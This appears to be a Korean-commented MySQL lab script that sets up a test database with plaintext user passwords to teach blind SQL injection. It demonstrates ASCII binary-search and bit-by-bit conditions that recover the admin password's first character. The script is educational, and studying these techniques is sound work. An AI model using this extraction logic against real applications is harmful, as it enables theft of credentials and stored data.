-- Binary Search 및 Bit 연산을 이용한 Blind SQL Injection 실습 SQL 스크립트

-- 데이터베이스 생성
CREATE DATABASE IF NOT EXISTS blind_sqli;
USE blind_sqli;

-- 사용자 생성 및 권한 부여 (테스트 환경에서만 실행)
CREATE USER IF NOT EXISTS 'blind'@'localhost' IDENTIFIED BY 'injection';
GRANT ALL PRIVILEGES ON blind_sqli.* TO 'blind'@'localhost';
FLUSH PRIVILEGES;

-- users 테이블 생성
DROP TABLE IF EXISTS users;
CREATE TABLE users (
  id INT AUTO_INCREMENT PRIMARY KEY,
  username VARCHAR(50) NOT NULL,
  password VARCHAR(100) NOT NULL
);

-- 예시 데이터 삽입
INSERT INTO users (username, password) VALUES
('admin', 'P@ssword'),
('user1', 'hello123'),
('user2', 'welcome');

-- Binary Search 기반 Blind SQLI 테스트 예시
-- 패스워드의 첫 글자 ASCII 값 비교
SELECT * FROM users WHERE username='admin' AND ascii(substr(password, 1, 1)) > 79;
SELECT * FROM users WHERE username='admin' AND ascii(substr(password, 1, 1)) < 100;

-- Bit 연산 기반 Blind SQLI 테스트 예시
-- 첫 글자의 ASCII 값을 이진수로 변환하여 각 비트 추출
SELECT bin(ord('P'));

-- 실제 사용자 패스워드 첫 글자 비트 비교 (P = 80 = 1010000)
SELECT * FROM users WHERE username='admin' AND substr(bin(ord(password)), 1, 1) = '1';
SELECT * FROM users WHERE username='admin' AND substr(bin(ord(password)), 2, 1) = '0';
SELECT * FROM users WHERE username='admin' AND substr(bin(ord(password)), 3, 1) = '1';
SELECT * FROM users WHERE username='admin' AND substr(bin(ord(password)), 4, 1) = '0';
SELECT * FROM users WHERE username='admin' AND substr(bin(ord(password)), 5, 1) = '0';
SELECT * FROM users WHERE username='admin' AND substr(bin(ord(password)), 6, 1) = '0';
SELECT * FROM users WHERE username='admin' AND substr(bin(ord(password)), 7, 1) = '0';
